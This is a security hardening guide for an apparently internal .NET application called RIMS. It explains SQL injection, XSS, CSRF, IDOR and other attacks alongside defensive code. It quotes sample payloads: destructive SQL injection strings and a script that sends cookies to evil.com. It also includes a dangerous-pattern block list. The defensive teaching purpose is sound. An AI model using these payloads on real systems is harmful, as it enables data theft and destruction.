# 06 — Security & Attack Prevention

> Comprehensive defense-in-depth strategy with code examples  
> SQL injection, XSS, CSRF, IDOR, session hijacking, and more

---

## Table of Contents

1. [SQL Injection Prevention](#1-sql-injection-prevention)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#3-cross-site-request-forgery-csrf)
4. [Insecure Direct Object Reference (IDOR)](#4-insecure-direct-object-reference-idor)
5. [Session Hijacking & Fixation](#5-session-hijacking--fixation)
6. [Broken Authentication](#6-broken-authentication)
7. [Mass Assignment / Over-Posting](#7-mass-assignment--over-posting)
8. [Denial of Service (DoS)](#8-denial-of-service-dos)
9. [Server-Side Request Forgery (SSRF)](#9-server-side-request-forgery-ssrf)
10. [Security Headers](#10-security-headers)
11. [Dependency & Supply Chain Security](#11-dependency--supply-chain-security)

---

## 1. SQL Injection Prevention

### 1.1 Current Vulnerability in RIMS

```csharp
// ? VULNERABLE — ReferralAssembler.FetchAllReferral()
appFitlerList.Add(
    $"a.{item.Key} {item.Value.MatchMode.getFilterCondition((object)item.Value.Value)}"
);
// User-controlled item.Key and item.Value.Value are interpolated into SQL!

// Attack example:
// item.Value.Value = "'; DROP TABLE Application; --"
// Resulting SQL: a.ReferenceNumber = ''; DROP TABLE Application; --'
```

### 1.2 How SQL Injection Works

```
Normal input:  "REF001"
Resulting SQL:  SELECT * FROM Application WHERE ReferenceNumber = 'REF001'

Malicious input:  "' OR 1=1; --"
Resulting SQL:  SELECT * FROM Application WHERE ReferenceNumber = '' OR 1=1; --'
                                                                        ? Returns ALL records

Destructive input:  "'; DELETE FROM ApplicationMember; --"
Resulting SQL:  SELECT * FROM Application WHERE ReferenceNumber = '';
                DELETE FROM ApplicationMember; --'
                ? Deletes all member records!
```

### 1.3 Prevention — Parameterized Queries

```csharp
// ? SAFE — Always use SqlParameter
var param = new SqlParameter("@refNum", SqlDbType.NVarChar) { Value = userInput };
var results = await context.Database
    .SqlQueryRaw<ApplicationCdto>(
        "SELECT * FROM Application WHERE ReferenceNumber = @refNum", param)
    .ToListAsync(ct);

// ? SAFE — EF Core LINQ (always parameterized)
var results = await context.Applications
    .Where(a => a.ReferenceNumber == userInput)
    .ToListAsync(ct);

// ? SAFE — EF Core interpolated SQL (auto-parameterized)
var results = await context.Database
    .SqlQuery<ApplicationCdto>(
        $"SELECT * FROM Application WHERE ReferenceNumber = {userInput}")
    .ToListAsync(ct);
// Note: SqlQuery (not SqlQueryRaw) auto-parameterizes interpolated values

// ? SAFE — Column name validation via allow-list
private static readonly HashSet<string> AllowedColumns = new() { "ReferenceNumber", "Status" };
if (!AllowedColumns.Contains(columnName))
    throw new ValidationException($"Invalid filter: {columnName}");
```

---

## 2. Cross-Site Scripting (XSS)

### 2.1 How XSS Works

```
Stored XSS — Attacker saves malicious script in database
1. Attacker saves referral note: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
2. Victim opens the referral notes page
3. Browser renders the note, executing the script
4. Cookie/session data sent to attacker

Reflected XSS — Malicious script in URL/request
1. Attacker crafts URL: /referrals?search=<script>alert('XSS')</script>
2. Server reflects the search term in the response without encoding
3. Browser executes the script
```

### 2.2 Prevention in RIMS

```csharp
// ? EXISTING: CSP headers (Content Security Policy)
app.UseSecurityMiddleware(options =>
{
    // ENHANCED: Remove unsafe-inline and unsafe-eval
    options.ContentSecurityPolicy = 
        "default-src 'self'; " +
        "img-src 'self' blob: data: https:; " +
        "script-src 'self' 'nonce-{RANDOM}'; " +  // Nonce-based instead of unsafe-inline
        "style-src 'self' 'nonce-{RANDOM}'; " +
        "frame-src 'self'; " +
        "connect-src 'self'; " +
        "form-action 'self'; " +
        "base-uri 'self'";
});

// ? EXISTING: System.Text.Json auto-encodes output
// JSON serialization HTML-encodes special characters by default

// ? NEW: Input sanitization for text fields
public class InputSanitizer
{
    private static readonly string[] DangerousPatterns = new[]
    {
        "<script", "javascript:", "onerror=", "onload=",
        "eval(", "expression(", "url(", "import("
    };

    public static string Sanitize(string input)
    {
        if (string.IsNullOrWhiteSpace(input)) return input;

        // HTML encode
        input = System.Net.WebUtility.HtmlEncode(input);

        // Check for encoded attack patterns
        var lower = input.ToLowerInvariant();
        if (DangerousPatterns.Any(p => lower.Contains(p)))
            throw new ValidationException("Input contains potentially dangerous content");

        return input;
    }
}

// Angular (EXISTING): Angular auto-sanitizes template bindings
// {{ value }} — auto-escaped
// [innerHTML]="value" — Angular's DomSanitizer active
```

---

## 3. Cross-Site Request Forgery (CSRF)

### 3.1 How CSRF Works

```
1. User logs into RIMS (has valid auth cookie/JWT)
2. User visits malicious site in another tab
3. Malicious site contains:
   <form action="https://rims.example.com/api/Referral/DenyReferral" method="POST">
     <input type="hidden" name="applicationId" value="12345">
     <input type="submit" value="Click to win!">
   </form>
4. User clicks ? browser sends request WITH the user's JWT cookie
5. RIMS processes the request as if the user intended it
```

### 3.2 RIMS CSRF Protection (Existing — Comprehensive)

```csharp
// ? EXISTING: Anti-forgery token pipeline
// Server-side (Web.UI)
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-XSRF-TOKEN";
    options.SuppressXFrameOptionsHeader = true;
});

// Token generation endpoint
app.MapGet("api/antiforgery/token", (IAntiforgery forgeryService, HttpContext context) =>
{
    var tokens = forgeryService.GetAndStoreTokens(context);
    context.Response.Headers["X-XSRF-TOKEN"] = tokens.RequestToken;
    return Results.Ok();
}).RequireAuthorization();

// Client-side (Angular) — HttpService adds XSRF token to every POST
// private postDataWithXsrf(url, body, token, options) {
//     headers = headers.set('X-XSRF-TOKEN', token);
//     return this.httpClient.post(url, body, httpOptions);
// }

// MVC Controllers auto-validate via [AutoValidateAntiforgeryToken]
builder.Services.AddControllersWithViews(options =>
{
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
});
```

### 3.3 Additional CSRF Hardening

```csharp
// ? NEW: SameSite cookie policy
builder.Services.Configure<CookiePolicyOptions>(options =>
{
    options.MinimumSameSitePolicy = SameSiteMode.Strict;
    options.Secure = CookieSecurePolicy.Always;
    options.HttpOnly = Microsoft.AspNetCore.CookiePolicy.HttpOnlyPolicy.Always;
});

// ? NEW: Origin validation
public class OriginValidationMiddleware
{
    public async Task InvokeAsync(HttpContext context, RequestDelegate next)
    {
        if (HttpMethods.IsPost(context.Request.Method) ||
            HttpMethods.IsPut(context.Request.Method) ||
            HttpMethods.IsDelete(context.Request.Method))
        {
            var origin = context.Request.Headers.Origin.FirstOrDefault();
            var referer = context.Request.Headers.Referer.FirstOrDefault();

            if (!string.IsNullOrEmpty(origin) && 
                !_allowedOrigins.Contains(new Uri(origin).Host))
            {
                context.Response.StatusCode = 403;
                return;
            }
        }
        await next(context);
    }
}
```

---

## 4. Insecure Direct Object Reference (IDOR)

### 4.1 How IDOR Works

```
1. User A has access to case #100: GET /api/CaseManagement/GetCaseDetails?caseId=100
2. User A changes the ID: GET /api/CaseManagement/GetCaseDetails?caseId=200
3. If no authorization check, User A sees case #200 (belongs to User B)
```

### 4.2 Prevention

```csharp
// ? NEW: Authorization checks in handlers
public class GetCaseDetailsHandler : IQueryHandler<GetCaseDetailsQuery, CaseManagementDetailCdto>
{
    public async Task<CaseManagementDetailCdto> Handle(
        GetCaseDetailsQuery query, CancellationToken ct)
    {
        var caseManagement = await _readContext.CaseManagements
            .FirstOrDefaultAsync(c => c.Id == query.CaseId, ct);

        if (caseManagement == null)
            throw new NotFoundException($"Case {query.CaseId} not found");

        // IDOR check: verify user has access to this case
        var currentUserId = _sessionContext.GetUserAccountId();
        var userRole = _sessionContext.GetUserRole();

        if (userRole != RimsRole.Administrator && 
            userRole != RimsRole.Supervisor)
        {
            // Case worker can only access cases assigned to them or their county
            if (caseManagement.WorkerId != currentUserId && 
                !await IsInSameCounty(currentUserId, caseManagement.CountyId))
            {
                // Log unauthorized access attempt (HIPAA)
                await _auditService.LogUnauthorizedAccess(currentUserId, query.CaseId);
                throw new PHIAccessDeniedException(
                    "You do not have permission to access this case");
            }
        }

        return MapToDetailCdto(caseManagement);
    }
}
```

---

## 5. Session Hijacking & Fixation

### 5.1 RIMS Session Architecture

```
Angular (sessionStorage) ? JWT tokens ? Web.UI (validates JWT)
                                              ?
                                        Session ID headers ? App.WebApi
```

### 5.2 Protection Measures

```csharp
// ? EXISTING: JWT with short expiration
// AuthAccessTokenExpiration = 15 minutes
// RefreshToken rotation prevents reuse

// ? EXISTING: Session stored in sessionStorage (not localStorage)
// sessionStorage is tab-scoped — cleared on tab close

// ? NEW: Token binding to IP/User-Agent
public TokenDetails GenerateTokens(string username, IEnumerable<Claim> claims, 
    DateTime now, string ipAddress, string userAgent, bool isNoAuth = false)
{
    var enrichedClaims = claims.Append(
        new Claim("ip_hash", ComputeHash(ipAddress)))
        .Append(new Claim("ua_hash", ComputeHash(userAgent)));

    // Token is bound to the client — different IP/UA invalidates it
}

// ? NEW: Refresh token rotation with reuse detection
public TokenDetails Refresh(string refreshToken, string accessToken, DateTime now)
{
    if (!_usersRefreshTokens.TryGetValue(refreshToken, out var existingToken))
    {
        // Token not found — possible theft. Revoke ALL tokens for this user.
        RevokeAllTokensForUser(userName);
        throw new SecurityTokenException("Refresh token reuse detected — all sessions revoked");
    }

    // Issue new tokens and invalidate the used refresh token
    _usersRefreshTokens.TryRemove(refreshToken, out _);
    return GenerateTokens(userName, principal.Claims, now, isNoAuth);
}
```

---

## 6. Broken Authentication

### 6.1 Account Lockout

```csharp
// ? NEW: Progressive delay and lockout
public class LoginProtectionService
{
    private readonly ConcurrentDictionary<string, LoginAttemptInfo> _attempts = new();

    public async Task<bool> ShouldBlockLogin(string username)
    {
        if (_attempts.TryGetValue(username, out var info))
        {
            // Lock after 5 failed attempts for 30 minutes
            if (info.FailedCount >= 5 && 
                info.LastAttempt.AddMinutes(30) > DateTime.UtcNow)
            {
                await _auditService.LogAccountLockout(username);
                return true;
            }

            // Progressive delay: 0, 2, 4, 8, 16 seconds
            var delay = Math.Pow(2, Math.Min(info.FailedCount, 4));
            await Task.Delay(TimeSpan.FromSeconds(delay));
        }
        return false;
    }

    public void RecordFailedAttempt(string username)
    {
        _attempts.AddOrUpdate(username,
            _ => new LoginAttemptInfo { FailedCount = 1 },
            (_, info) => { info.FailedCount++; info.LastAttempt = DateTime.UtcNow; return info; });
    }

    public void ResetAttempts(string username) => _attempts.TryRemove(username, out _);
}
```

---

## 7. Mass Assignment / Over-Posting

### 7.1 How It Works

```
POST /api/Account/UpdateUserAccount
Body: { "firstName": "John", "lastName": "Doe", "roleId": 1 }
                                                    ? Attacker adds roleId to make themselves admin
```

### 7.2 Prevention

```csharp
// ? EXISTING: UnmappedMemberHandling = JsonUnmappedMemberHandling.Disallow
// This rejects any JSON properties not defined in the DTO

// ? NEW: Separate input DTOs from domain entities
// Never bind directly to domain entities

// Input DTO — only allowed fields
public record UpdateUserAccountInput(
    string FirstName,
    string LastName,
    string Email,
    string Phone);
// RoleId, StatusId etc. are NOT in this DTO — cannot be mass-assigned

// Handler maps explicitly
handler.User.FirstName = input.FirstName;
handler.User.LastName = input.LastName;
// RoleId is NEVER set from user input
```

---

## 8. Denial of Service (DoS)

### 8.1 Rate Limiting

```csharp
// ? NEW: .NET 8 built-in rate limiting
builder.Services.AddRateLimiter(options =>
{
    // Global rate limit
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",
            factory: _ => new FixedWindowRateLimiterOptions
            {
                PermitLimit = 100,
                Window = TimeSpan.FromMinutes(1),
                QueueLimit = 10,
                QueueProcessingOrder = QueueProcessingOrder.OldestFirst
            }));

    // Strict limit for login endpoint
    options.AddFixedWindowLimiter("login", config =>
    {
        config.PermitLimit = 5;
        config.Window = TimeSpan.FromMinutes(5);
    });

    // Strict limit for file upload
    options.AddFixedWindowLimiter("upload", config =>
    {
        config.PermitLimit = 10;
        config.Window = TimeSpan.FromMinutes(1);
    });

    options.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
});

// Apply
app.UseRateLimiter();
```

### 8.2 Request Size Limits

```csharp
// Prevent large payload attacks
builder.Services.Configure<KestrelServerOptions>(options =>
{
    options.Limits.MaxRequestBodySize = 10 * 1024 * 1024; // 10MB
    options.Limits.MaxRequestHeadersTotalSize = 32 * 1024; // 32KB
});

// File upload specific limit
builder.Services.Configure<FormOptions>(options =>
{
    options.MultipartBodyLengthLimit = 10 * 1024 * 1024;
});
```

---

## 9. Server-Side Request Forgery (SSRF)

### 9.1 Risk in RIMS

The `Web.ServiceClient` makes HTTP calls to `App.WebApi`. The base URL comes from configuration. If an attacker could modify the configuration, they could redirect internal API calls.

### 9.2 Prevention

```csharp
// ? Validate service URLs at startup
var baseUrl = new Uri(appSettings.BaseUrl);
if (!allowedHosts.Contains(baseUrl.Host))
    throw new InvalidOperationException($"Untrusted API host: {baseUrl.Host}");

// ? EXISTING: HttpRequestClientHandler uses Windows credentials
// Only works with trusted internal servers
```

---

## 10. Security Headers

```csharp
// ? EXISTING + ENHANCED
app.UseSecurityMiddleware(options =>
{
    options.ContentSecurityPolicy = "default-src 'self'; ...";
    options.RemoveHeaders = ["Server", "X-Powered-By", "X-AspNetMvc-Version", "X-AspNet-Version"];
});

// ? NEW: Additional security headers
app.Use(async (context, next) =>
{
    context.Response.Headers["X-Content-Type-Options"] = "nosniff";
    context.Response.Headers["X-Frame-Options"] = "DENY";
    context.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    context.Response.Headers["Permissions-Policy"] = 
        "camera=(), microphone=(), geolocation=(), payment=()";
    context.Response.Headers["Cross-Origin-Opener-Policy"] = "same-origin";
    context.Response.Headers["Cross-Origin-Resource-Policy"] = "same-origin";
    await next();
});
```

---

## 11. Dependency & Supply Chain Security

```xml
<!-- ? NEW: Enable NuGet package vulnerability scanning -->
<PropertyGroup>
    <NuGetAudit>true</NuGetAudit>
    <NuGetAuditLevel>moderate</NuGetAuditLevel>
    <NuGetAuditMode>all</NuGetAuditMode>
</PropertyGroup>

<!-- ? Pin package versions — avoid floating versions -->
<PackageReference Include="Microsoft.EntityFrameworkCore" Version="8.0.6" />
<!-- Never use Version="8.*" -->
```

```yaml
# ? NEW: Azure DevOps pipeline with security scanning
- task: DotNetCoreCLI@2
  displayName: 'NuGet Vulnerability Audit'
  inputs:
    command: 'restore'
    arguments: '--audit'
```
